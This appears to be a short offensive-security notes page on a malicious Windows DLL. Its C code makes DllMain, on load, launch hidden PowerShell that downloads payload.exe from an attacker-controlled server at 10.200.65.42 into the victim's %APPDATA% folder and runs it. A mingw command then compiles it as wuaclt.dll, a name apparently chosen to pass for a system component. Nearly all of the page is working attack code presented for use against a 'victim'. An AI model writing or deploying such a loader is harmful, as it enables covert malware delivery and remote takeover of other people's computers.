---
description: DLL Download and execute reverse shell
---

# DLL

When the DLL is loaded, it silently launches PowerShell, downloads `payload.exe` from our web server into the victim's `%APPDATA%` directory, and then executes it.

{% code overflow="wrap" %}
```bash
		#include <windows.h>
		
		#pragma comment(lib, "user32.lib")
		
		BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
		{
		    switch (fdwReason)
		    {
		        case DLL_PROCESS_ATTACH:
		            WinExec("powershell.exe -WindowStyle Hidden -Command \"Invoke-WebRequest http://10.200.65.42/payload.exe -OutFile $env:APPDATA\\payload.exe; Start-Process $env:APPDATA\\payload.exe\"", SW_SHOW);
		            break;
		    }
		
		    return TRUE;
		}
```
{% endcode %}

We compile the DLL...

{% code overflow="wrap" %}
```bash
x86_64-w64-mingw32-gcc -shared poc.c -o wuaclt.dll
```
{% endcode %}

\
<br>
